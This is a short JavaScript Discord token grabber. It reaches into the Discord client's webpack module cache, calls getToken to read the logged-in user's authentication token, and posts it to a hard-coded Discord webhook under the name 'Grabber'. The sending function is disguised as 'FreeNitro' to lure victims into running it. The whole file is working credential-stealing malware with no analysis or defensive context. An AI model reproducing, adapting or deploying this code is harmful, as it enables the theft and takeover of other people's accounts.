const webhookurl = 'https://discord.com/api/webhooks/832676577409892412/JFlf61n_mSA7CPgwE3wKwYd6YGqg5iNd9nm0ofF-xQqG6Q2LLZ4ANeUYgZHsFoXUsKA9';

var req = webpackJsonp.push([
    [], {
        extra_id: (e, t, r) => e.exports = r
    },
    [
        ["extra_id"]
    ]
]);
for (let e in req.c)
    if (req.c.hasOwnProperty(e)) {
        let t = req.c[e].exports;
        if (t && t.__esModule && t.default)
            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
    }
function FreeNitro() {
    var e = new XMLHttpRequest;
    e.open("POST", webhookurl), e.setRequestHeader("Content-type", "application/json");
    var t = {
        username: "Grabber",
        avatar_url: "https://cdn.discordapp.com/attachments/736612991948030037/751790394462961715/450.png",
        content: "",
        embeds: [{
            color: "4700374",
            description: "Token : " + token,
            footer: {
                text: "no"
            }
        }]
    };
    e.send(JSON.stringify(t))
}
FreeNitro();
